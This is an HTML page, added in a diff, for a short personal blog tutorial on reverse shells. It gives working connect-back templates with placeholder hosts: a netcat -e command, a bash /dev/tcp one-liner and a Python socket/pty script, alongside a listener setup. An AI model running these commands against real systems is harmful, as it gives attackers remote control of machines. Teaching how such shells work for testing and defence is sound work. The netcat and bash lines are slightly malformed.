@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Reverse Shell :: YunchoHang</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A brief Introduction to Reverse Shell and its useage." />
+<meta name="keywords" content="reverse, shell, hacking" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/posts/reverse_shell/" />
+
+
+  
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.e025eb3c5fa252277379d81db5199f496189643bc489aedeaf558ff4979ac918.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Reverse Shell">
+<meta property="og:description" content="A brief Introduction to Reverse Shell and its useage." />
+<meta property="og:url" content="http://localhost:1313/posts/reverse_shell/" />
+<meta property="og:site_name" content="YunchoHang" />
+
+  
+  
+  <meta property="og:image" content="http://localhost:1313/images/b1/shell.jpg">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Blogs
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+        
+          <li><a href="/about">WhoAmI</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+        
+          <li><a href="/about" >WhoAmI</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/posts/reverse_shell/">Reverse Shell</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/shell/">shell</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/cybersecurity/">cybersecurity</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/rce/">rce</a>&nbsp;
+      
+    </span>
+  
+  
+  <img src="http://localhost:1313/images/b1/shell.jpg"
+    class="post-cover"
+    alt="Reverse Shell"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="what-is-a-reverse-shell">What is a Reverse Shell?<a href="#what-is-a-reverse-shell" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>A reverse shell is a type of shell where the target machine initiates a connection to the attacker&rsquo;s machine, bypassing firewall restrictions that might block incoming connections. This method is widely used in penetration testing and malicious attacks to gain remote control access of the targets system.</p>
+<h2 id="how-does-reverse-shell-works">How does Reverse shell works?<a href="#how-does-reverse-shell-works" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>The attacker sets up a listener on their machine. Once the target&rsquo;s machine is exploited, the attacker execute a command that starts an outbound connection to the machine.Then the attacker receives the connection and gain remote access to executes commands on the target&rsquo;s machine.</p>
+<h2 id="some-common-reverse-shell-method">Some Common Reverse Shell Method:<a href="#some-common-reverse-shell-method" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Reverse shell can be established using various programming languages and tools. Here I will show you some of the commonly used methods.</p>
+<ol>
+<li>
+<p><strong>Netcat (nc)</strong><br>
+Netcat is simple yet very powerful networking tool that can be used for reverse shells. This is how you can get reverse shell using netcat.<br>
+On the attacker machine set up netcat listener using:<br>
+<code>nc -lvnp &lt;Port&gt;</code><br>
+On the Target&rsquo;s machine execute the following command:<br>
+<code>nc.traditional -e &lt;Lhost_IP&gt; &lt;Port&gt;</code><br>
+<em>Output:</em>
+<img alt="Using Netcat" src="/images/b1/nc.png"></p>
+</li>
+<li>
+<p><strong>Bash Reverse Shell</strong><br>
+A bash one liner can be used to establish a reverse shell.<br>
+<code>bash -i &gt;&amp; /dev/tcp/&lt;Lhost_IP/&lt;Port&gt; 0&gt;&amp;1</code><br>
+Make sure to setup netcat listener before executing the command.<br>
+<em>Output:</em>
+<img alt="Using Bash" src="/images/b1/bash.png"></p>
+</li>
+<li>
+<p><strong>Python Reverse Shell</strong><br>
+Python is most used language for crafting tools among hackers. Copy the script below and run it on the target machine using python3.</p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;&lt;Lhost_IP&gt;&#34;</span>,<span style="color:#ae81ff">4444</span>))
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pty
+</span></span><span style="display:flex;"><span>pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>)
+</span></span></code></pre></div><p><em>Output:</em>
+<img alt="Using python" src="/images/b1/py.png"></p>
+<h2 id="final-thoughts">Final Thoughts!<a href="#final-thoughts" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Reverse shells are a powerful tool in both penetration testing and cyberattacks. Understanding how they works is important for both offensive and
+defensive cybersecurity. While attackers use them to gain access, security professionals must implement proper measures to detect and prevent these threats.</p>
+
+      </div></div>
+
+  
+    
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
